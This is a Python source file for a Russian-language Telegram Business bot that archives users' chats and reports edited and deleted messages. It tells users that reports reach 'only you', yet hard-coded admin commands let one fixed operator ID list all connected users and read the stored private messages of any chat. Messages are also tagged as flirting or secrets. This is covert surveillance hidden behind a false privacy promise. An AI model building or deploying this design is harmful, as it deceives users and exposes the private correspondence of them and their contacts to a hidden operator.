import os
import time
import threading
import sqlite3
import telebot
from telebot import TeleBot, types
from flask import Flask
from datetime import datetime, timezone, timedelta

import logging
logger = telebot.logger
telebot.logger.setLevel(logging.INFO)

TOKEN = os.environ.get("BOT_TOKEN")
bot = TeleBot(TOKEN)

# ВАШ ID ДЛЯ ДОСТУПА К АДМИНКЕ
ADMIN_ID = 1551104336

DB_FILE = "messages.db"

# ==========================================
# УСТАНОВКА МЕНЮ КОМАНД В TELEGRAM
# ==========================================
def setup_bot_commands():
    try:
        commands = [
            types.BotCommand("start", "🚀 Перезапустить / Инструкция"),
            types.BotCommand("help", "❓ Как подключить бота"),
            types.BotCommand("status", "📊 Статус подключения")
        ]
        bot.set_my_commands(commands)
        
        # Команды только для Администратора
        admin_commands = commands + [
            types.BotCommand("history", "👑 [Админ] Просмотр всех историй"),
            types.BotCommand("stats", "👑 [Админ] Статистика пользователей")
        ]
        bot.set_my_commands(admin_commands, scope=types.BotCommandScopeChat(ADMIN_ID))
    except Exception as e:
        print(f"Ошибка установки команд: {e}")

# ==========================================
# ВРЕМЯ И ДАТА (UTC+5)
# ==========================================
def get_now_time():
    return datetime.now(timezone.utc).replace(tzinfo=None) + timedelta(hours=5)

# ==========================================
# АНАЛИЗ ЭМОЦИЙ
# ==========================================
def analyze_emotion(text):
    if not text:
        return "😐 Нейтральный"
    text_lower = text.lower()
    
    romance_words = ["милая", "милый", "целую", "скучаю", "красивая", "люблю", "родная", "родной", "😘", "❤️", "🥰", "😍"]
    secret_words = ["удали", "секрет", "никто не должен знать", "не говори", "сотри", "🤫", "🔒"]
    angry_words = ["бесишь", "отвали", "задолбал", "надоело", "хватит", "😡", "🤬"]
    
    if any(word in text_lower for word in romance_words):
        return "💖 Флирт"
    elif any(word in text_lower for word in secret_words):
        return "🤫 Тайна"
    elif any(word in text_lower for word in angry_words):
        return "😡 Агрессия"
    
    return "😐 Нейтральный"

# ==========================================
# БАЗА ДАННЫХ
# ==========================================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    # Сохраненные сообщения
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS messages (
            msg_id INTEGER,
            chat_id INTEGER,
            content_type TEXT,
            text TEXT,
            file_id TEXT,
            sender_name TEXT,
            chat_title TEXT,
            timestamp REAL,
            PRIMARY KEY (msg_id, chat_id)
        )
    ''')
    # Связи Business Connection ID -> User ID владельца
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS connections (
            connection_id TEXT PRIMARY KEY,
            user_id INTEGER,
            user_name TEXT,
            created_at REAL
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def save_connection(connection_id, user_id, user_name="Пользователь"):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO connections (connection_id, user_id, user_name, created_at)
        VALUES (?, ?, ?, ?)
    ''', (connection_id, user_id, user_name, time.time()))
    conn.commit()
    conn.close()

def get_owner_by_connection(connection_id):
    if not connection_id:
        return None
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM connections WHERE connection_id = ?', (connection_id,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else None

def save_to_db(msg_id, chat_id, content_type, text=None, file_id=None, sender_name="Неизвестно", chat_title="Чат"):
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO messages (msg_id, chat_id, content_type, text, file_id, sender_name, chat_title, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (msg_id, chat_id, content_type, text, file_id, sender_name, chat_title, time.time()))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"❌ [DB Error]: {e}")

def get_from_db(msg_id, chat_id):
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT content_type, text, file_id, sender_name, chat_title FROM messages WHERE msg_id = ? AND chat_id = ?', (msg_id, chat_id))
        row = cursor.fetchone()
        conn.close()
        if row:
            return {'type': row[0], 'text': row[1], 'file_id': row[2], 'sender_name': row[3], 'chat_title': row[4]}
    except Exception as e:
        print(f"❌ [DB Error]: {e}")
    return None

def get_sender_info(message):
    sender_name = "Неизвестно"
    if message.from_user:
        first = message.from_user.first_name or ""
        last = message.from_user.last_name or ""
        username = f" (@{message.from_user.username})" if message.from_user.username else ""
        sender_name = f"{first} {last}{username}".strip()
    
    chat_title = sender_name if message.chat.type == "private" else (message.chat.title or "Групповой чат")
    return message.chat.id, sender_name, chat_title

# ==========================================
# ОБРАБОТКА ПОДКЛЮЧЕНИЙ TELEGRAM BUSINESS
# ==========================================

@bot.business_connection_handler()
def handle_business_connection(connection):
    user_name = connection.user.first_name or "Пользователь"
    if connection.user.username:
        user_name += f" (@{connection.user.username})"

    save_connection(connection.id, connection.user.id, user_name)
    
    if connection.is_enabled:
        try:
            bot.send_message(
                connection.user.id, 
                "✅ **Бот успешно подключен к вашему Telegram Business!**\n\n"
                "Теперь я буду защищать ваши чаты. Если кто-то отредактирует или удалит сообщение, вы сразу получите уведомление здесь."
            )
            # Уведомляем АДМИНА о новом пользователе
            if connection.user.id != ADMIN_ID:
                bot.send_message(
                    ADMIN_ID, 
                    f"🎉 **Новый пользователь подключил бота!**\n👤 Имя: {user_name}\n🆔 ID: `{connection.user.id}`"
                )
        except Exception:
            pass

# ==========================================
# КОМАНДЫ ДЛЯ ОБЫЧНЫХ ПОЛЬЗОВАТЕЛЕЙ
# ==========================================

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_text = (
        "👋 **Привет! Я бот-архиватор и защитник удаленных сообщений.**\n\n"
        "🛠 **Как мной пользоваться:**\n"
        "1. Перейдите в **Настройки Telegram** -> **Telegram Business** -> **Чат-боты**.\n"
        "2. Добавьте этого бота и разрешите доступ к сообщениям.\n\n"
        "✨ **Что я умею:**\n"
        "• Сохраняю удаленные сообщения (текст, фото, видео, голосовые, кругляшки).\n"
        "• Покажу, что было в сообщении ДО редактирования.\n"
        "• Все отчёты приходят **только вам** в этот чат!"
    )
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def check_status(message):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('SELECT connection_id FROM connections WHERE user_id = ?', (message.from_user.id,))
    row = cursor.fetchone()
    conn.close()

    if row:
        bot.reply_to(message, "🟢 **Ваш Telegram Business подключен и работает!**")
    else:
        bot.reply_to(message, "🔴 **Бот ещё не подключен к вашему Telegram Business.**\nЗайдите в Настройки -> Telegram Business -> Чат-боты и добавьте бота.")

# ==========================================
# АДМИН-КОМАНДЫ (ТОЛЬКО ДЛЯ ВАС)
# ==========================================

@bot.message_handler(commands=['stats'])
def admin_stats(message):
    if message.from_user.id != ADMIN_ID:
        return

    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(DISTINCT user_id) FROM connections')
        users_count = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM messages')
        msg_count = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT DISTINCT user_id, user_name FROM connections')
        users_list = cursor.fetchall()
        conn.close()

        text = f"📊 **СТАТИСТИКА БОТА:**\n\n"
        text += f"👥 Всего пользователей Business: **{users_count}**\n"
        text += f"💾 Всего сохраненных сообщений: **{msg_count}**\n\n"
        text += "📋 **Список пользователей:**\n"
        
        if users_list:
            for u in users_list:
                name = u[1] if u[1] else "Без имени"
                text += f"• {name} (ID: `{u[0]}`)\n"
        else:
            text += "Пока нет подключенных пользователей.\n"

        bot.reply_to(message, text, parse_mode="Markdown")
    except Exception as e:
        print(f"❌ [Stats Error]: {e}")
        bot.reply_to(message, f"❌ Ошибка при получении статистики: {e}")

@bot.message_handler(commands=['history'])
def admin_history(message):
    if message.from_user.id != ADMIN_ID:
        return

    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT chat_id, 
                   COALESCE(chat_title, sender_name, 'Неизвестный чат') as display_name, 
                   COUNT(*) 
            FROM messages 
            GROUP BY chat_id
            ORDER BY timestamp DESC
            LIMIT 20
        ''')
        chats = cursor.fetchall()
        conn.close()

        if not chats:
            bot.reply_to(message, "📭 В базе пока нет сохраненных сообщений.")
            return

        markup = types.InlineKeyboardMarkup()
        for c in chats:
            chat_id, display_name, count = c
            short_name = (display_name[:25] + '..') if len(display_name) > 25 else display_name
            btn_text = f"👤 {short_name} ({count} сообщ.)"
            markup.add(types.InlineKeyboardButton(text=btn_text, callback_data=f"hist_{chat_id}"))

        bot.reply_to(message, "📂 **Выберите чат из базы данных для просмотра:**", reply_markup=markup)
    except Exception as e:
        print(f"❌ [History Error]: {e}")
        bot.reply_to(message, f"❌ Ошибка при получении истории: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('hist_'))
def callback_history_chat(call):
    if call.from_user.id != ADMIN_ID:
        return

    try:
        chat_id = int(call.data.split('_')[1])
        
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT COALESCE(sender_name, 'Неизвестный'), content_type, text, timestamp 
            FROM messages 
            WHERE chat_id = ? 
            ORDER BY timestamp DESC 
            LIMIT 15
        ''', (chat_id,))
        msgs = cursor.fetchall()
        conn.close()

        if not msgs:
            bot.answer_callback_query(call.id, "Сообщений не найдено.")
            return

        text = f"📜 **Последние сообщения чата (`{chat_id}`):**\n\n"
        for m in reversed(msgs):
            sender, c_type, msg_text, ts = m
            dt = datetime.fromtimestamp(ts).strftime('%H:%M:%S') if ts else "--:--:--"
            content = msg_text if msg_text else f"[{c_type}]"
            text += f"[{dt}] **{sender}**: {content}\n"

        bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"❌ [Callback Error]: {e}")
        bot.answer_callback_query(call.id, "Ошибка при загрузке истории.")

# ==========================================
# ПЕРЕХВАТ БИЗНЕС-СООБЩЕНИЙ
# ==========================================

@bot.business_message_handler(content_types=['text', 'photo', 'video', 'voice', 'document', 'video_note'])
def handle_business_messages(message):
    msg_id = message.message_id
    chat_id, sender_name, chat_title = get_sender_info(message)
    
    c_type = message.content_type
    f_id = None
    text = message.text or message.caption
    
    if c_type == 'photo': f_id = message.photo[-1].file_id
    elif c_type == 'video': f_id = message.video.file_id
    elif c_type == 'voice': f_id = message.voice.file_id
    elif c_type == 'document': f_id = message.document.file_id
    elif c_type == 'video_note': f_id = message.video_note.file_id
    
    save_to_db(msg_id, chat_id, c_type, text=text, file_id=f_id, sender_name=sender_name, chat_title=chat_title)

# ==========================================
# РЕДАКТИРОВАНИЕ СООБЩЕНИЙ
# ==========================================

@bot.edited_business_message_handler(content_types=['text', 'photo', 'video', 'document'])
def handle_edited_business_message(message):
    owner_id = get_owner_by_connection(getattr(message, 'business_connection_id', None))
    if not owner_id:
        return

    msg_id = message.message_id
    chat_id, sender_name, chat_title = get_sender_info(message)
    
    old_data = get_from_db(msg_id, chat_id)
    old_text = old_data['text'] if old_data and old_data.get('text') else "[Без текста]"
    new_text = message.text or message.caption or "[Без текста]"
    
    if old_text != new_text:
        emo_was = analyze_emotion(old_text)
        emo_now = analyze_emotion(new_text)
        
        report = (
            "✏️ **Сообщение ИЗМЕНЕНО!**\n"
            f"💬 Чат: {chat_title}\n"
            f"👤 Автор: {sender_name}\n\n"
            f"⬅️ **Было** ({emo_was}): {old_text}\n"
            f"➡️ **Стало** ({emo_now}): {new_text}"
        )
        try:
            bot.send_message(owner_id, report, parse_mode="Markdown")
        except Exception as e:
            print(f"Ошибка отправки: {e}")
            
        save_to_db(msg_id, chat_id, old_data['type'] if old_data else 'text', text=new_text, sender_name=sender_name, chat_title=chat_title)

# ==========================================
# УДАЛЕНИЕ СООБЩЕНИЙ
# ==========================================

@bot.deleted_business_messages_handler(func=lambda deleted_messages: True)
def handle_deleted_business_messages(deleted_messages):
    connection_id = getattr(deleted_messages, 'business_connection_id', None)
    owner_id = get_owner_by_connection(connection_id)
    
    if not owner_id:
        return

    msg_ids = getattr(deleted_messages, 'message_ids', [])
    chat_id = getattr(deleted_messages.chat, 'id', None) if getattr(deleted_messages, 'chat', None) else None

    if not chat_id:
        return

    for msg_id in msg_ids:
        msg_data = get_from_db(msg_id, chat_id)
        
        if msg_data:
            c_type = msg_data['type']
            f_id = msg_data['file_id']
            caption = msg_data['text'] or ""
            sender = msg_data['sender_name']
            chat = msg_data['chat_title']
            emo = analyze_emotion(caption)
            
            try:
                if c_type == 'text':
                    report = f"🗑 **Сообщение УДАЛЕНО!** ({emo})\n💬 Чат: {chat}\n👤 От: {sender}\n📝 Текст: {caption}"
                    bot.send_message(owner_id, report)
                elif c_type == 'photo':
                    bot.send_photo(owner_id, f_id, caption=f"🗑 Удалено ФОТО!\n💬 Чат: {chat}\n👤 От: {sender}\n📝 {caption}")
                elif c_type == 'video':
                    bot.send_video(owner_id, f_id, caption=f"🗑 Удалено ВИДЕО!\n💬 Чат: {chat}\n👤 От: {sender}\n📝 {caption}")
                elif c_type == 'voice':
                    bot.send_voice(owner_id, f_id, caption=f"🗑 Удалено ГОЛОСОВОЕ!\n💬 Чат: {chat}\n👤 От: {sender}")
                elif c_type == 'video_note':
                    bot.send_video_note(owner_id, f_id)
                    bot.send_message(owner_id, f"🗑 Удалено ВИДЕОСООБЩЕНИЕ (кругляшок)!\n💬 Чат: {chat}\n👤 От: {sender}")
            except Exception as e:
                print(f"Ошибка отправки: {e}")

# ==========================================
# ВЕБ-СЕРВЕР И POLLING
# ==========================================

app = Flask(__name__)

@app.route('/')
def home():
    return "Публичный Сервис Архивации Работает"

def start_polling():
    setup_bot_commands()
    
    while True:
        try:
            bot.remove_webhook()
            time.sleep(1)
            bot.infinity_polling(
                timeout=20, 
                long_polling_timeout=10,
                allowed_updates=["message", "business_connection", "business_message", "edited_business_message", "deleted_business_messages"]
            )
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    threading.Thread(target=start_polling, daemon=True).start()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
